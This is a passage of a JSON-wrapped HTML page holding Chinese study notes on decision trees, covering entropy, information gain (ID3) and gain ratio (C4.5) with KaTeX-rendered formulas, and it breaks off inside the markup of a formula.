            "content_html": "<h1 id=\"决策树\"><a class=\"anchor\" href=\"#决策树\">#</a> 决策树</h1>\n<p>（Decision Tree）</p>\n<p>一种对实例进行<strong>分类</strong>的<strong>树形结构</strong>，通过<strong>多层判断</strong>区分目标所属类别</p>\n<p><strong>本质</strong>：通过多层判断，从训练数据集中归纳出一组分类规则</p>\n<p>优点：</p>\n<ul>\n<li>计算量小，运算速度快</li>\n<li>易于理解，可清晰查看各属性的重要性</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>忽略属性间的<strong>相关性</strong></li>\n<li>样本类别<strong>分布不均匀</strong>时容易影响模型表现</li>\n</ul>\n<blockquote>\n<h2 id=\"求解方法\"><a class=\"anchor\" href=\"#求解方法\">#</a> 求解方法</h2>\n</blockquote>\n<p><strong>问题核心</strong>：<mark>属性选择</mark>（每一个节点，应该选用哪个属性）</p>\n<p><strong>信息熵</strong>：</p>\n<p>熵是衡量数据集纯度的一个指标（也是度量不确定性的指标）。<br />\n对于一个类别变量 C 的数据集 D, 其熵定义为：<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>E</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>p</mi><mi>y</mi><mo stretchy=\"false\">(</mo><mi>D</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo>−</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><msub><mi>n</mi><mi>c</mi></msub></msubsup><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>c</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>c</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">Entropy(D)=-\\sum_{i=1}^{n_c}P(c_i)\\log_2P(c_i)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">ro</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.104em;vertical-align:-0.2997em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8043em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1645em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">c</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2997em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.207em;\"><span style=\"top:-2.4559em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2441em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span><br />\n 其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>n</mi><mi>c</mi></msub></mrow><annotation encoding=\"application/x-tex\">n_c</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">c</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是类别 C 的个数，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>c</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">P(c_i)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 是类别 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>c</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">c_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5806em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 在数据集 D 中出现的概率。</p>\n<p><strong>纯度</strong>：</p>\n<p>某次分类中，正确的被分类样本占所有样本的比率。</p>\n<p><strong>关键步骤</strong>：</p>\n<ol>\n<li><strong>属性选择</strong>：<br />\n在每个节点上，算法会选择一个最优属性作为分割标准。这一过程可以通过计算不同属性的信息增益（<strong>ID3</strong>）、信息增益比（<strong>C4.5</strong>）或基尼不纯度（<strong>CART</strong>）来进行。</li>\n</ol>\n<ul>\n<li>\n<p><strong>信息增益</strong>：衡量属性 A 对数据集 D 划分后<strong>信息熵</strong>减少的程度，表示为：<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>a</mi><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>D</mi><mo separator=\"true\">,</mo><mi>A</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>E</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>p</mi><mi>y</mi><mo stretchy=\"false\">(</mo><mi>D</mi><mo stretchy=\"false\">)</mo><mo>−</mo><msubsup><mo>∑</mo><mrow><mi>v</mi><mo>=</mo><mn>1</mn></mrow><mi>V</mi></msubsup><mfrac><mrow><mi mathvariant=\"normal\">∣</mi><msub><mi>D</mi><mi>v</mi></msub><mi mathvariant=\"normal\">∣</mi></mrow><mrow><mi mathvariant=\"normal\">∣</mi><mi>D</mi><mi mathvariant=\"normal\">∣</mi></mrow></mfrac><mi>E</mi><mi>n</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>p</mi><mi>y</mi><mo stretchy=\"false\">(</mo><msub><mi>D</mi><mi>v</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">Gain(D,A)=Entropy(D)-\\sum_{v=1}^V\\frac{|D_v|}{|D|}Entropy(D_v)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\">ain</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\">A</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">ro</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.53em;vertical-align:-0.52em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9812em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">v</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">V</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2997em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.01em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mtight\">∣</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.485em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1645em;\"><span style=\"top:-2.357em;margin-left:-0.0278em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">v</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mord mtight\">∣</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.52em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">ro</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">v</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span><br />\n 其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>V</mi></mrow><annotation encoding=\"application/x-tex\">V</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span></span></span></span> 是属性 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\">A</span></span></span></span> 的不同取值个数，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>D</mi><mi>v</mi></msub></mrow><annotation encoding=\"application/x-tex\">D_v</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">v</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示在属性 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\">A</span></span></span></span> 上取值为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>v</mi></mrow><annotation encoding=\"application/x-tex\">v</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span></span></span></span> 时数据集 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi></mrow><annotation encoding=\"application/x-tex\">D</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span></span> 的子集，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">∣</mi><msub><mi>D</mi><mi>v</mi></msub><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">|D_v|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">v</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">∣</mi><mi>D</mi><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">|D|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord\">∣</span></span></span></span> 分别表示子集和总数据集的样本数量。</p>\n</li>\n<li>\n<p><strong>信息增益比</strong>：信息增益与属性固有值的熵之比（因为 ID3 偏向于选择具有较多属性值的属性，可能导致过拟合）。<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>a</mi><mi>i</mi><msub><mi>n</mi><mrow><mi>r</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi></mrow></msub><mo stretchy=\"false\">(</mo><mi>D</mi><mo separator=\"true\">,</mo><mi>A</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mfrac><mrow><mi>G</mi><mi>a</mi><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>D</mi><mo separator=\"true\">,</mo><mi>A</mi><mo stretchy=\"false\">)</mo></mrow><mrow><msub><mi>H</mi><mi>A</mi></msub><mo stretchy=\"false\">(</mo><mi>D</mi><mo stretchy=\"false\">)</mo></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">Gain_{ratio}(D,A) =\\frac{Gain(D,A)}{H_A(D)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\">ai</span><span class=\"mord\"><span class=\"mord mathnormal\">n</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal mtight\">a</span><span class=\"mord mathnormal mtight\">t</span><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\">o</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\">A</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.53em;vertical-align:-0.52em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.01em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3567em;margin-left:-0.0813em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">A</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1433em;\"><span></span></span></span></span></span></span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span><span class=\"mclose mtight\">)</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.485em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">G</span><span class=\"mord mathnormal mtight\">ain</span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\">A</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.52em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span><br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>H</mi><mi>A</mi></msub><mo stretchy=\"false\">(</mo><mi>D</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo>−</mo><msubsup><mo>∑</mo><mrow><mi>v</mi><mo>=</mo><mn>1</mn></mrow><mi>V</mi></msubsup><mfrac><mrow><mi mathvariant=\"normal\">∣</mi><msub><mi>D</mi><mi>v</mi></msub><mi mathvariant=\"normal\">∣</mi></mrow><mrow><mi mathvariant=\"normal\">∣</mi><mi>D</mi><mi mathvariant=\"normal\">∣</mi></mrow></mfrac><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mfrac><mrow><mi mathvariant=\"normal\">∣</mi><msub><mi>D</mi><mi>v</mi></msub><mi mathvariant=\"normal\">∣</mi></mrow><mrow><mi mathvariant=\"normal\">∣</mi><mi>D</mi><mi mathvariant=\"normal\">∣</mi></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">H_{A}(D) =-\\sum_{v=1}^V\\frac{|D_v|}{|D|}log_2\\frac{|D_v|}{|D|}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3283em;\"><span style=\"top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">A</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.53em;vertical-align:-0.52em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9812em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">v</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">V</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2997em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.01em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord 